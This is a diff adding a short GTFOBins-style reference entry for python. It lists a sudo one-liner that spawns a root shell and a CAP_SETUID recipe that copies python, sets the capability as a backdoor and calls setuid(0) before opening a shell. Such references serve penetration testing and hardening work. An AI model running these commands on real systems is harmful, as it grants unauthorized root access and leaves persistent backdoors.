@@ -1,0 +1,13 @@
+***** Sudo *****
+If the binary is allowed to run as superuser by sudo, it does not drop the
+elevated privileges and may be used to access the file system, escalate or
+maintain privileged access.
+    * sudo python -c 'import os; os.system("/bin/sh")'
+***** Capabilities *****
+If the binary has the Linux CAP_SETUID capability set or it is executed by
+another binary with the capability set, it can be used as a backdoor to
+maintain privileged access by manipulating its own process UID.
+    * cp $(which python) .
+      sudo setcap cap_setuid+ep python
+
+      ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
